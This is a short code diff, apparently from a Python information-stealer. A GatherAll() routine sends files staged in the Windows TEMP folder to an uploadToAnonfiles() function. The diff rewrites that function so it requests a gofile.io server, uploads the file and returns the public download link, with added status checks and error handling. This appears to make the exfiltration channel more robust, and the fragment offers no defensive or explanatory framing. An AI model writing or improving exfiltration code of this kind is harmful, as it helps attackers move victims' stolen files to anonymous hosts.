@@ -783,8 +783,28 @@ def GatherAll():
         upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
 
 def uploadToAnonfiles(path):
-    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
-    except:return False
+    try:
+        # pegar servidor
+        server_res = requests.get("https://api.gofile.io/getServer").json()
+        server = server_res["data"]["server"]
+
+        # upload
+        with open(path, "rb") as f:
+            upload_res = requests.post(
+                f"https://{server}.gofile.io/uploadFile",
+                files={"file": f}
+            ).json()
+
+        # validar resposta
+        if upload_res.get("status") == "ok":
+            return upload_res["data"].get("downloadPage") or upload_res["data"].get("downloadUrl")
+
+        print("Upload failed:", upload_res)
+        return False
+
+    except Exception as e:
+        print("Error:", e)
+        return False
 
 # def uploadToAnonfiles(path):s
 #     try:
